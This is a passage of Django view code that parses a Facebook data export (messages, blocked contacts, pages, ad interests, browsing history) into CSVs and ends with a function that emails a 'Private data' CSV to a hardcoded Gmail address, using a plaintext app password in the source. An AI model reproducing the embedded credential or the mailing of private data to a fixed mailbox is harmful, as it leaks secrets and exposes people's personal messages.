    messages_only_path: str = 'D:/webapp/project/media/facebook_{}/messages'.format(today_time)

    path1: str = messages_only_path + "/inbox/"

    # x1 = open(path1)
    # d1 = json.load(x1)

    arr1 = os.listdir(path1)

    inbox_list = []
    for i in range(0, len(arr1)):
        inbox_list.append(path1 + arr1[i])

    # print(inbox_list)

    only_msgs = []
    for i in range(0, len(inbox_list)):
        one_1 = 'message_1.json'
        two_2 = 'photos'
        if len(os.listdir(inbox_list[i])) == 1:
            only_msgs.append(inbox_list[i] + "/" + one_1)
        elif len(os.listdir(inbox_list[i])) == 2:
            only_msgs.append(inbox_list[i] + "/" + one_1)

    title_name1, name1, message1 = [], [], []
    for i in range(0, len(only_msgs)):
        path = only_msgs[i]
        x = json.load(open(path))
        name = (x["participants"][0]['name'])
        title_name1.append(x["participants"][0]['name'])
        for i in range(0, len(x["messages"])):
            if "content" in (x["messages"][i]):
                name1.append(x["messages"][i]["sender_name"])
                message1.append(x["messages"][i]["content"])

    dict_common = {'Name': name1, 'messages': message1}
    dataframe1 = pd.DataFrame(dict_common)
    csv_path = newpath + "/" + csv_folder_name + ".csv"
    dataframe1.to_csv(csv_path)
    print(csv_path)

    dict1 = {'Name': name1, 'messages': message1}
    df1 = pd.DataFrame(dict1)
    df1.replace({'Name': {'à¤\x85à¤®à¤¿à¤¤ à¤\x9aà¥\x8cà¤§à¤°à¥\x80': 'You'}}, inplace=True)
    df1.to_csv(csv_path)

    df_1 = pd.read_csv(csv_path)

    name_lst1 = df_1['Name'].tolist()
    date_lst1 = df_1['messages'].tolist()

    allData1 = []
    for i in range(df_1.shape[0]):
        temp = df_1.iloc[i]
        allData1.append(dict(temp))

    """
    text indentation link := https://blog.hubspot.com/website/html-space
    """

    """
    (Messenger contacts you've blocked)
    """

    path2: str = messages_only_path + "/messenger_contacts_you've_blocked.json"

    x2 = open(path2)
    d2 = json.load(x2)

    timestamp2 = []
    name2 = []
    uri2 = []

    for i in range(0, len(d2["messenger_contacts_blocked_v2"]["entries"])):
        timestamp2.append(d2["messenger_contacts_blocked_v2"]["entries"][i]["timestamp"])
        name2.append(d2["messenger_contacts_blocked_v2"]["entries"][i]["data"]["name"])
        uri2.append(d2["messenger_contacts_blocked_v2"]["entries"][i]["data"]["uri"])

    dict2 = {'name': name2, 'timestamp': timestamp2, 'uri': uri2}
    df2 = pd.DataFrame(dict2)

    from datetime import datetime

    date2 = []
    time2 = []
    for i in range(0, len(df2['timestamp'])):
        date2.append(datetime.fromtimestamp(int(df2['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time2.append(datetime.fromtimestamp(int(df2['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df2['date'] = date2
    df2['time'] = time2

    path2_csv = path2[:-4] + 'csv'

    df2.to_csv(path2_csv)

    df_2 = pd.read_csv(path2_csv)

    name_lst2 = df_2['name'].tolist()
    date_lst2 = df_2['date'].tolist()
    time_lst2 = df_2['time'].tolist()
    uri_lst2 = df_2['uri'].tolist()

    allData2 = []
    for i in range(df_2.shape[0]):
        temp = df_2.iloc[i]
        allData2.append(dict(temp))

    """
    (previously_removed_contacts)
    """

    path3: str = messages_only_path + "/previously_removed_contacts.json"

    x3 = open(path3)
    d3 = json.load(x3)

    timestamp3 = []
    name3 = []

    for i in range(0, len(d3["previous_removed_contacts_v2"]["entries"])):
        timestamp3.append(d3["previous_removed_contacts_v2"]["entries"][i]["timestamp"])
        name3.append(d3["previous_removed_contacts_v2"]["entries"][i]["data"]["name"])

    dict3 = {'name': name3, 'timestamp': timestamp3}
    df3 = pd.DataFrame(dict3)

    from datetime import datetime

    date3 = []
    time3 = []
    for i in range(0, len(df3['timestamp'])):
        date3.append(datetime.fromtimestamp(int(df3['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time3.append(datetime.fromtimestamp(int(df3['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df3['date'] = date3
    df3['time'] = time3

    path3_csv = path3[:-4] + 'csv'

    df3.to_csv(path3_csv)

    df_3 = pd.read_csv(path3_csv)

    name_lst3 = df_3['name'].tolist()
    date_lst3 = df_3['date'].tolist()
    time_lst3 = df_3['time'].tolist()

    allData3 = []
    for i in range(df_3.shape[0]):
        temp = df_3.iloc[i]
        allData3.append(dict(temp))

    context = {"allData1": allData1, "name1": name1, "message1": message1, "title_name1": title_name1,
               "allData2": allData2, "allData3": allData3}

    return render(request, 'app/messages_only.html', context)


def pages_only(request):
    """
    ["pages_you've_liked.json", "pages_you've_unfollowed.json", 'pages_you_follow.json']
    """

    # importing libraries
    import time
    from datetime import date, datetime
    import zipfile
    import os
    import datetime
    import json
    import pandas as pd

    """
    # pages_you've_liked
    """

    today_time = date.fromtimestamp(time.time())
    pages_only_path: str = 'D:/webapp/project/media/facebook_{}/pages'.format(today_time)

    path1: str = pages_only_path + "/pages_you've_liked.json"

    x1 = open(path1)
    d1 = json.load(x1)

    name1 = []
    timestamp1 = []

    for i in range(0, len(d1['page_likes_v2'])):
        name1.append(d1['page_likes_v2'][i]['name'])
        timestamp1.append(d1['page_likes_v2'][i]['timestamp'])

    dict1 = {'name': name1, 'timestamp': timestamp1}
    df1 = pd.DataFrame(dict1)

    from datetime import datetime

    date1 = []
    time1 = []
    for i in range(0, len(df1['timestamp'])):
        date1.append(datetime.fromtimestamp(int(df1['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time1.append(datetime.fromtimestamp(int(df1['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df1['date'] = date1
    df1['time'] = time1

    path1_csv = path1[:-4] + 'csv'

    df1.to_csv(path1_csv)

    df_1 = pd.read_csv(path1_csv)

    name_lst1 = df_1['name'].tolist()
    date_lst1 = df_1['date'].tolist()
    time_lst1 = df_1['time'].tolist()

    allData1 = []
    for i in range(df_1.shape[0]):
        temp = df_1.iloc[i]
        allData1.append(dict(temp))

    """
    # pages_you've_unfollowed
    """

    path2: str = pages_only_path + "/pages_you've_unfollowed.json"

    x2 = open(path2)
    d2 = json.load(x2)

    title2 = []
    timestamp2 = []

    for i in range(0, len(d2["pages_unfollowed_v2"])):
        timestamp2.append(d2['pages_unfollowed_v2'][i]['timestamp'])
        title2.append(d2['pages_unfollowed_v2'][i]['title'])

    dict2 = {'title': title2, 'timestamp': timestamp2}
    df2 = pd.DataFrame(dict2)

    from datetime import datetime

    date2 = []
    time2 = []
    for i in range(0, len(df2['timestamp'])):
        date2.append(datetime.fromtimestamp(int(df2['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time2.append(datetime.fromtimestamp(int(df2['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df2['date'] = date2
    df2['time'] = time2

    path2_csv = path2[:-4] + 'csv'

    df2.to_csv(path2_csv)

    df_2 = pd.read_csv(path2_csv)

    title_lst2 = df_2['title'].tolist()
    date_lst2 = df_2['date'].tolist()
    time_lst2 = df_2['time'].tolist()

    allData2 = []
    for i in range(df_2.shape[0]):
        temp = df_2.iloc[i]
        allData2.append(dict(temp))

    """
    # pages_you_follow
    """

    path3: str = pages_only_path + "/pages_you_follow.json"

    x3 = open(path3)
    d3 = json.load(x3)

    title3 = []
    timestamp3 = []

    for i in range(0, len(d3["pages_followed_v2"])):
        timestamp3.append(d3['pages_followed_v2'][i]['timestamp'])
        title3.append(d3['pages_followed_v2'][i]['title'])

    dict3 = {'title': title3, 'timestamp': timestamp3}
    df3 = pd.DataFrame(dict3)

    from datetime import datetime

    date3 = []
    time3 = []
    for i in range(0, len(df3['timestamp'])):
        date3.append(datetime.fromtimestamp(int(df3['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time3.append(datetime.fromtimestamp(int(df3['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df3['date'] = date3
    df3['time'] = time3

    path3_csv = path3[:-4] + 'csv'

    df3.to_csv(path3_csv)

    df_3 = pd.read_csv(path3_csv)

    title_lst3 = df_3['title'].tolist()
    date_lst3 = df_3['date'].tolist()
    time_lst3 = df_3['time'].tolist()

    allData3 = []
    for i in range(df_3.shape[0]):
        temp = df_3.iloc[i]
        allData3.append(dict(temp))

    context = {"allData1": allData1, "allData2": allData2, "allData3": allData3}

    return render(request, 'app/pages_only.html', context)


def other_logged_information(request):
    """
    ads_interests
    """
    # importing libraries
    import time
    from datetime import date, datetime
    import zipfile
    import os
    import datetime
    import json
    import pandas as pd

    today_time = date.fromtimestamp(time.time())
    other_logged_information_path: str = 'D:/webapp/project/media/facebook_{}/other_logged_information'.format(
        today_time)

    path1: str = other_logged_information_path + "/ads_interests.json"

    x1 = open(path1)
    d1 = json.load(x1)

    all_ads = []

    for i in range(0, len(d1['topics_v2'])):
        all_ads.append(d1['topics_v2'][i])

    dict1 = {"all_ads": all_ads}

    df1 = pd.DataFrame(dict1)

    path1_csv = path1[:-4] + 'csv'

    df1.to_csv(path1_csv)

    df_1 = pd.read_csv(path1_csv)

    all_ads_lst = df_1['all_ads']

    context = {"all_ads_lst": all_ads_lst}

    return render(request, 'app/other_logged_information.html', context)


def your_interactions_on_facebook(request):
    """
    ['recently_viewed.json', 'recently_visited.json']
    """

    """
    recently_viewed
    """

    # importing libraries
    import time
    from datetime import date, datetime
    import zipfile
    import os
    import datetime
    import json
    import pandas as pd

    today_time = date.fromtimestamp(time.time())
    your_interactions_on_facebook_path: str = 'D:/webapp/project/media/facebook_{}/your_interactions_on_facebook'.format(
        today_time)

    print("your_interactions_on_facebook")
    print(your_interactions_on_facebook)

    path1: str = your_interactions_on_facebook_path + "/recently_viewed.json"

    x1 = open(path1)
    d1 = json.load(x1)

    name1, name2, name3, name4, name5, name6, name7 = [], [], [], [], [], [], []
    description1, description2, description3, description4, description5, description6, description7 = [], [], [], [], [], [], []
    timestamp1, timestamp2, timestamp3, timestamp4, timestamp5, timestamp6 = [], [], [], [], [], []
    sub_name1, sub_name2, sub_name3, sub_name4, sub_name5, sub_name6 = [], [], [], [], [], []
    uri1, uri2, uri3, uri4, share5, uri6 = [], [], [], [], [], []
    spl_name1, spl_desc1, spl_sub_val1, spl_sub_val2, spl_sub_val_a, spl_sub_val_b = [], [], [], [], [], []

    for i in range(0, len(d1['recently_viewed'])):
        if i == 0:
            name1.append(d1['recently_viewed'][i]['name'])
            description1.append(d1['recently_viewed'][i]['description'])
            for j in range(0, len(d1['recently_viewed'][i]['children'][0]['entries'])):
                timestamp1.append(d1['recently_viewed'][i]['children'][0]['entries'][j]['timestamp'])
                sub_name1.append(d1['recently_viewed'][i]['children'][0]['entries'][j]['data']['name'])
                uri1.append(d1['recently_viewed'][i]['children'][0]['entries'][j]['data']['uri'])

        if i == 1:
            name2.append(d1['recently_viewed'][i]['name'])
            description2.append(d1['recently_viewed'][i]['description'])
            for j in range(0, len(d1['recently_viewed'][i]['entries'])):
                timestamp2.append(d1['recently_viewed'][i]['entries'][j]['timestamp'])
                sub_name2.append(d1['recently_viewed'][i]['entries'][j]['data']['name'])
                uri2.append(d1['recently_viewed'][i]['entries'][j]['data']['uri'])

        if i == 2:
            name3.append(d1['recently_viewed'][i]['name'])
            description3.append(d1['recently_viewed'][i]['description'])
            for j in range(0, len(d1['recently_viewed'][i]['entries'])):
                timestamp3.append(d1['recently_viewed'][i]['entries'][j]['timestamp'])
                sub_name3.append(d1['recently_viewed'][i]['entries'][j]['data']['name'])
                uri3.append(d1['recently_viewed'][i]['entries'][j]['data']['uri'])

        if i == 3:
            name4.append(d1['recently_viewed'][i]['name'])
            description4.append(d1['recently_viewed'][i]['description'])
            for j in range(0, len(d1['recently_viewed'][i]['entries'])):
                timestamp4.append(d1['recently_viewed'][i]['entries'][j]['timestamp'])
                sub_name4.append(d1['recently_viewed'][i]['entries'][j]['data']['name'])
                uri4.append(d1['recently_viewed'][i]['entries'][j]['data']['uri'])

        if i == 4:
            name5.append(d1['recently_viewed'][i]['name'])
            description5.append(d1['recently_viewed'][i]['description'])
            for j in range(0, len(d1['recently_viewed'][i]['entries'])):
                timestamp5.append(d1['recently_viewed'][i]['entries'][j]['timestamp'])
                sub_name5.append(d1['recently_viewed'][i]['entries'][j]['data']['name'])
                share5.append(d1['recently_viewed'][i]['entries'][j]['data']['share'])

        if i == 5:
            name6.append(d1['recently_viewed'][i]['name'])
            description6.append(d1['recently_viewed'][i]['description'])
            for j in range(0, len(d1['recently_viewed'][i]['children'])):
                spl_name1.append(d1['recently_viewed'][i]['children'][j]['name'])
                spl_desc1.append(d1['recently_viewed'][i]['children'][j]['description'])
                for k in range(0, len(d1['recently_viewed'][i]['children'][j]['entries'])):
                    if j == 0:
                        spl_sub_val1.append(d1['recently_viewed'][i]['children'][j]['entries'][k]['data']['value'])
                    if j == 1:
                        spl_sub_val2.append(d1['recently_viewed'][i]['children'][j]['entries'][k]['data']['value'])
                    if j == 2:
                        spl_sub_val_a.append(d1['recently_viewed'][i]['children'][j]['entries'][k]['data']['name'])
                        spl_sub_val_b.append(d1['recently_viewed'][i]['children'][j]['entries'][k]['data']['uri'])

        if i == 6:
            name7.append(d1['recently_viewed'][i]['name'])
            description7.append(d1['recently_viewed'][i]['description'])
            for j in range(0, len(d1['recently_viewed'][i]['entries'])):
                timestamp6.append(d1['recently_viewed'][i]['entries'][j]['timestamp'])
                sub_name6.append(d1['recently_viewed'][i]['entries'][j]['data']['name'])
                uri6.append(d1['recently_viewed'][i]['entries'][j]['data'].get('uri', "NA"))

                # note here .get method is used to collect data but if there is no data available then it doesnt throw error
                # https://stackoverflow.com/questions/53928345/how-to-handle-missing-key-in-python-dictionary

    dict1 = {"timestamp": timestamp1, "sub_name": sub_name1, "uri": uri1}
    df1 = pd.DataFrame(dict1)

    from datetime import datetime

    date1 = []
    time1 = []

    for i in range(0, len(df1['timestamp'])):
        date1.append(datetime.fromtimestamp(int(df1['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time1.append(datetime.fromtimestamp(int(df1['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df1['date'] = date1
    df1['time'] = time1

    path1_csv = path1[:-4] + 'csv'

    df1.to_csv(path1_csv)

    df_1 = pd.read_csv(path1_csv)

    # name1_lst = df_1['name'].tolist()
    # description1_lst = df_1['description'].tolist()
    timestamp1_lst = df_1['timestamp'].tolist()
    sub_name1_lst = df_1['sub_name'].tolist()
    uri1_lst = df_1['uri'].tolist()
    date1_lst = df_1['date'].tolist()
    time1_lst = df_1['time'].tolist()

    allData1 = []
    for i in range(df_1.shape[0]):
        temp1 = df_1.iloc[i]
        allData1.append(dict(temp1))

    dict2 = {"timestamp": timestamp2, "sub_name": sub_name2, "uri": uri2}
    df2 = pd.DataFrame(dict2)

    from datetime import datetime

    date2 = []
    time2 = []

    for i in range(0, len(df2['timestamp'])):
        date2.append(datetime.fromtimestamp(int(df2['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time2.append(datetime.fromtimestamp(int(df2['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df2['date'] = date2
    df2['time'] = time2

    path2_csv = path1[:-4] + 'csv'

    df2.to_csv(path2_csv)

    df_2 = pd.read_csv(path2_csv)

    # name2_lst = df_2['name'].tolist()
    # description2_lst = df_2['description'].tolist()
    timestamp2_lst = df_2['timestamp'].tolist()
    sub_name2_lst = df_2['sub_name'].tolist()
    uri2_lst = df_2['uri'].tolist()
    date2_lst = df_2['date'].tolist()
    time2_lst = df_2['time'].tolist()

    allData2 = []
    for i in range(df_2.shape[0]):
        temp2 = df_2.iloc[i]
        allData2.append(dict(temp2))

    dict3 = {"timestamp": timestamp3, "sub_name": sub_name3, "uri": uri3}
    df3 = pd.DataFrame(dict3)

    from datetime import datetime

    date3 = []
    time3 = []

    for i in range(0, len(df3['timestamp'])):
        date3.append(datetime.fromtimestamp(int(df3['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time3.append(datetime.fromtimestamp(int(df3['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df3['date'] = date3
    df3['time'] = time3

    path3_csv = path1[:-4] + 'csv'

    df3.to_csv(path3_csv)

    df_3 = pd.read_csv(path3_csv)

    # name3_lst = df_3['name'].tolist()
    # description3_lst = df_3['description'].tolist()
    timestamp3_lst = df_3['timestamp'].tolist()
    sub_name3_lst = df_3['sub_name'].tolist()
    uri3_lst_lst = df_3['uri'].tolist()
    date3_lst = df_3['date'].tolist()
    time3_lst = df_3['time'].tolist()

    allData3 = []
    for i in range(df_3.shape[0]):
        temp3 = df_3.iloc[i]
        allData3.append(dict(temp3))

    dict4 = {"timestamp": timestamp4, "sub_name": sub_name4, "uri": uri4}
    df4 = pd.DataFrame(dict4)

    from datetime import datetime

    date4 = []
    time4 = []

    for i in range(0, len(df4['timestamp'])):
        date4.append(datetime.fromtimestamp(int(df4['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time4.append(datetime.fromtimestamp(int(df4['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df4['date'] = date4
    df4['time'] = time4

    path4_csv = path1[:-4] + 'csv'

    df4.to_csv(path4_csv)

    df_4 = pd.read_csv(path4_csv)

    timestamp4_lst = df_4['timestamp'].tolist()
    sub_name4_lst = df_4['sub_name'].tolist()
    uri4_lst = df_4['uri'].tolist()
    date4_lst = df_4['date'].tolist()
    time4_lst = df_4['time'].tolist()

    allData4 = []
    for i in range(df_4.shape[0]):
        temp4 = df_4.iloc[i]
        allData4.append(dict(temp4))

    dict5 = {"timestamp": timestamp5, "sub_name": sub_name5, "share": share5}
    df5 = pd.DataFrame(dict5)

    from datetime import datetime

    date5 = []
    time5 = []

    for i in range(0, len(df5['timestamp'])):
        date5.append(datetime.fromtimestamp(int(df5['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time5.append(datetime.fromtimestamp(int(df5['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df5['date'] = date5
    df5['time'] = time5

    path5_csv = path1[:-4] + 'csv'

    df5.to_csv(path5_csv)

    df_5 = pd.read_csv(path5_csv)

    timestamp5_lst = df_5['timestamp'].tolist()
    sub_name5_lst = df_5['sub_name'].tolist()
    share5_lst = df_5['share'].tolist()
    date5_lst = df_5['date'].tolist()
    time5_lst = df_5['time'].tolist()

    allData5 = []
    for i in range(df_5.shape[0]):
        temp5 = df_5.iloc[i]
        allData5.append(dict(temp5))

    dict6 = {"spl_sub_val_a": spl_sub_val_a, "spl_sub_val_b": spl_sub_val_b}
    df6 = pd.DataFrame(dict6)

    path6_csv = path1[:-4] + 'csv'

    df6.to_csv(path6_csv)

    df_6 = pd.read_csv(path6_csv)

    spl_sub_val_a_lst = df_6['spl_sub_val_a'].tolist()
    spl_sub_val_b_lst = df_6['spl_sub_val_b'].tolist()

    allData6 = []
    for i in range(df_6.shape[0]):
        temp6 = df_6.iloc[i]
        allData6.append(dict(temp6))

    dict7 = {"timestamp": timestamp6, "sub_name": sub_name6, "uri": uri6}
    df7 = pd.DataFrame(dict7)

    date7 = []
    time7 = []

    for i in range(0, len(df7['timestamp'])):
        date7.append(datetime.fromtimestamp(int(df7['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time7.append(datetime.fromtimestamp(int(df7['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df7['date'] = date7
    df7['time'] = time7

    path7_csv = path1[:-4] + 'csv'

    df7.to_csv(path7_csv)

    df_7 = pd.read_csv(path7_csv)

    # name7_lst = df_7['name'].tolist()
    # description7_lst = df_7['description'].tolist()
    timestamp7_lst = df_7['timestamp'].tolist()
    sub_name7_lst = df_7['sub_name'].tolist()
    uri7_lst = df_7['uri'].tolist()
    date7_lst = df_7['date'].tolist()
    time7_lst = df_7['time'].tolist()

    allData7 = []
    for i in range(df_7.shape[0]):
        temp7 = df_7.iloc[i]
        allData7.append(dict(temp7))

    """
    recently_visited
    """

    path2: str = your_interactions_on_facebook_path + "/recently_visited.json"

    x2 = open(path2)
    d2 = json.load(x2)

    name1, name2, name3, name4, name5 = [], [], [], [], []
    description1, description2, description3, description4, description5 = [], [], [], [], []
    timestamp1, timestamp2, timestamp3, timestamp4 = [], [], [], []
    sub_name1, sub_name2, sub_name3, sub_name4 = [], [], [], []
    uri1, uri2, uri3, uri4 = [], [], [], []
    spl_sub_val1 = []

    for i in range(0, len(d2['visited_things_v2'])):
        if i == 0:
            name1.append(d2['visited_things_v2'][i]['name'])
            description1.append(d2['visited_things_v2'][i]['description'])
            for j in range(0, len(d2['visited_things_v2'][i]['entries'])):
                timestamp1.append(d2['visited_things_v2'][i]['entries'][j]['timestamp'])
                sub_name1.append(d2['visited_things_v2'][i]['entries'][j]['data']['name'])
                uri1.append(d2['visited_things_v2'][i]['entries'][j]['data']['uri'])

        if i == 1:
            name2.append(d2['visited_things_v2'][i]['name'])
            description2.append(d2['visited_things_v2'][i]['description'])
            for j in range(0, len(d2['visited_things_v2'][i]['entries'])):
                timestamp2.append(d2['visited_things_v2'][i]['entries'][j]['timestamp'])
                sub_name2.append(d2['visited_things_v2'][i]['entries'][j]['data']['name'])
                uri2.append(d2['visited_things_v2'][i]['entries'][j]['data']['uri'])

        if i == 2:
            name3.append(d2['visited_things_v2'][i]['name'])
            description3.append(d2['visited_things_v2'][i]['description'])
            for j in range(0, len(d2['visited_things_v2'][i]['entries'])):
                timestamp3.append(d2['visited_things_v2'][i]['entries'][j]['timestamp'])
                sub_name3.append(d2['visited_things_v2'][i]['entries'][j]['data']['name'])
                uri3.append(d2['visited_things_v2'][i]['entries'][j]['data']['uri'])

        if i == 3:
            name4.append(d2['visited_things_v2'][i]['name'])
            description4.append(d2['visited_things_v2'][i]['description'])
            for j in range(0, len(d2['visited_things_v2'][i]['entries'])):
                timestamp4.append(d2['visited_things_v2'][i]['entries'][j]['timestamp'])
                sub_name4.append(d2['visited_things_v2'][i]['entries'][j]['data']['name'])
                uri4.append(d2['visited_things_v2'][i]['entries'][j]['data']['uri'])

        if i == 4:
            name5.append(d2['visited_things_v2'][i]['name'])
            description5.append(d2['visited_things_v2'][i]['description'])
            for j in range(0, len(d2['visited_things_v2'][i]['entries'])):
                spl_sub_val1.append(d2['visited_things_v2'][i]['entries'][j]['data']['value'])

    dict11 = {"timestamp": timestamp1, "sub_name": sub_name1, "uri": uri1}
    df11 = pd.DataFrame(dict11)

    from datetime import datetime

    date11 = []
    time11 = []

    for i in range(0, len(df11['timestamp'])):
        date11.append(datetime.fromtimestamp(int(df11['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time11.append(datetime.fromtimestamp(int(df11['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df11['date'] = date11
    df11['time'] = time11

    path11_csv = path1[:-4] + 'csv'

    df11.to_csv(path11_csv)

    df_11 = pd.read_csv(path11_csv)

    timestamp_lst11 = df_11['timestamp'].tolist()
    sub_name_lst11 = df_11['sub_name'].tolist()
    uri_lst11 = df_11['uri'].tolist()
    date_lst11 = df_11['date'].tolist()
    time_lst11 = df_11['time'].tolist()

    allData11 = []
    for i in range(df_11.shape[0]):
        temp11 = df_11.iloc[i]
        allData11.append(dict(temp11))

    dict22 = {"timestamp": timestamp1, "sub_name": sub_name1, "uri": uri1}
    df22 = pd.DataFrame(dict22)

    from datetime import datetime

    date22 = []
    time22 = []

    for i in range(0, len(df22['timestamp'])):
        date22.append(datetime.fromtimestamp(int(df22['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time22.append(datetime.fromtimestamp(int(df22['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df22['date'] = date22
    df22['time'] = time22

    path22_csv = path1[:-4] + 'csv'

    df22.to_csv(path22_csv)

    df_22 = pd.read_csv(path22_csv)

    timestamp_lst22 = df_22['timestamp'].tolist()
    sub_name_lst22 = df_22['sub_name'].tolist()
    uri_lst22 = df_22['uri'].tolist()
    date_lst22 = df_22['date'].tolist()
    time_lst22 = df_22['time'].tolist()

    allData22 = []
    for i in range(df_22.shape[0]):
        temp22 = df_22.iloc[i]
        allData22.append(dict(temp22))

    dict33 = {"timestamp": timestamp1, "sub_name": sub_name1, "uri": uri1}
    df33 = pd.DataFrame(dict33)

    from datetime import datetime

    date33 = []
    time33 = []

    for i in range(0, len(df33['timestamp'])):
        date33.append(datetime.fromtimestamp(int(df33['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time33.append(datetime.fromtimestamp(int(df33['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df33['date'] = date33
    df33['time'] = time33

    path33_csv = path1[:-4] + 'csv'

    df33.to_csv(path33_csv)

    df_33 = pd.read_csv(path33_csv)

    timestamp_lst33 = df_33['timestamp'].tolist()
    sub_name_lst33 = df_33['sub_name'].tolist()
    uri_lst33 = df_33['uri'].tolist()
    date_lst33 = df_33['date'].tolist()
    time_lst33 = df_33['time'].tolist()

    allData33 = []
    for i in range(df_33.shape[0]):
        temp33 = df_33.iloc[i]
        allData33.append(dict(temp33))

    dict44 = {"timestamp": timestamp1, "sub_name": sub_name1, "uri": uri1}
    df44 = pd.DataFrame(dict44)

    from datetime import datetime

    date44 = []
    time44 = []

    for i in range(0, len(df44['timestamp'])):
        date44.append(datetime.fromtimestamp(int(df44['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time44.append(datetime.fromtimestamp(int(df44['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df44['date'] = date44
    df44['time'] = time44

    path44_csv = path1[:-4] + 'csv'

    df44.to_csv(path44_csv)

    df_44 = pd.read_csv(path44_csv)

    timestamp_lst44 = df_44['timestamp'].tolist()
    sub_name_lst44 = df_44['sub_name'].tolist()
    uri_lst44 = df_44['uri'].tolist()
    date_lst44 = df_44['date'].tolist()
    time_lst44 = df_44['time'].tolist()

    allData44 = []
    for i in range(df_44.shape[0]):
        temp44 = df_44.iloc[i]
        allData44.append(dict(temp44))

    context = {"allData1": allData1, "allData2": allData2, "allData3": allData3,
               "allData4": allData4, "allData5": allData5,
               "allData7": allData7, "name6": name6, "description6": description6,
               "spl_name1": spl_name1, "spl_desc1": spl_desc1, "spl_sub_val1": spl_sub_val1,
               "spl_sub_val2": spl_sub_val2, "spl_sub_val_a": spl_sub_val_a, "spl_sub_val_b": spl_sub_val_b,
               "allData11": allData11, "allData22": allData22, "allData33": allData33, "allData44": allData44,
               "spl_sub_val11": spl_sub_val1, "allData6": allData6}

    """
    dict6 = {"name": name6, "description": description6, "special category": spl_name1,
             "description of category": spl_desc1,
             "value 1": spl_sub_val1, "value 2": spl_sub_val2, "cat name": spl_sub_val_a, "cat uri": spl_sub_val_b}
    """

    return render(request, 'app/your_interactions_on_facebook.html', context)


def your_topics(request):
    """
    topic
    """
    import time
    from datetime import date, datetime
    import zipfile
    import os
    import datetime
    import json
    import pandas as pd

    current_date = date.fromtimestamp(time.time())
    your_topics_path = 'D:/webapp/project/media/facebook_{}/your_topics'.format(current_date)

    path1 = your_topics_path + "/your_topics.json"

    x1 = open(path1)
    d1 = json.load(x1)

    topics = []

    for i in range(0, len(d1['inferred_topics_v2'])):
        topics.append(d1['inferred_topics_v2'][i])

    dict1 = {"topics": topics}
    df1 = pd.DataFrame(dict1)

    path1_csv = path1[:-4] + 'csv'

    df1.to_csv(path1_csv)

    df_1 = pd.read_csv(path1_csv)

    topics_lst = df_1['topics'].tolist()

    allData1 = []
    for i in range(df_1.shape[0]):
        temp = df_1.iloc[i]
        allData1.append(dict(temp))

    context = {"topics": topics}

    return render(request, 'app/your_topics.html', context)


def profile_information(request):
    context = {}

    return render(request, 'app/profile_information.html', context)


def email(request):
    global csv_path
    import time
    from datetime import date, datetime
    import zipfile
    import os
    import datetime
    import json
    import pandas as pd
    """
    creating folder name as per file owner
    """
    today_time = date.fromtimestamp(time.time())
    csv_storing_name_path: str = 'D:/webapp/project/media/facebook_{}/profile_information'.format(today_time)

    path111: str = csv_storing_name_path + "/profile_information.json"

    xx1 = open(path111)
    dd1 = json.load(xx1)
    csv_folder_name = str(dd1['profile_v2']['name']["full_name"])
    csv_folder_name = str(csv_folder_name)

    newpath = r'D:/webapp/project/media/csv/' + csv_folder_name
    if not os.path.exists(newpath):
        os.makedirs(newpath)

    """
    SEND EMAIL
    """

    import email_to
    import email
    import smtplib
    import os
    from email.message import EmailMessage
    from email.mime.text import MIMEText
    # from email.mime.multipart import *
    import datetime
    import csv
    import glob
    from email.mime.multipart import MIMEMultipart
    from email.mime.application import MIMEApplication
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email import encoders
    import csv

    EMAIL_ADDRESS = os.environ.get('EMAIL_USER')
    EMAIL_PASSWORD = os.environ.get('EMAIL_PASS')
    user = 'myselfac9@gmail.com'
    password = 'rmdu iedn vnfe ezrv'

    msg = EmailMessage()
    msg['Subject'] = "Private data"
    msg['From'] = user
    msg['To'] = 'myselfac9@gmail.com'

    msg.set_content("There is an csv attached")

    user = 'myselfac9@gmail.com'
    password = 'rmdu iedn vnfe ezrv'

    path = f"D:/webapp/project/media/csv/{newpath}.csv"
    path = str(path)
    with open(path, 'rb') as f:
        x = f.read()
        print("binary data", f)
        xn = f.name
        print("binary file name", xn)
        msg.add_attachment(x, maintype='application', subtype='csv', filename=xn)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(user=user, password=password)

        smtp.send_message(msg)
